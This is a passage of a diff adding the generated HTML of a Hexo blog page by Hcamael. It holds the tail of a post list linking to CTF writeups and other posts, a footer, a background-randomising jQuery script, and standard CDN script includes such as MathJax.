class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
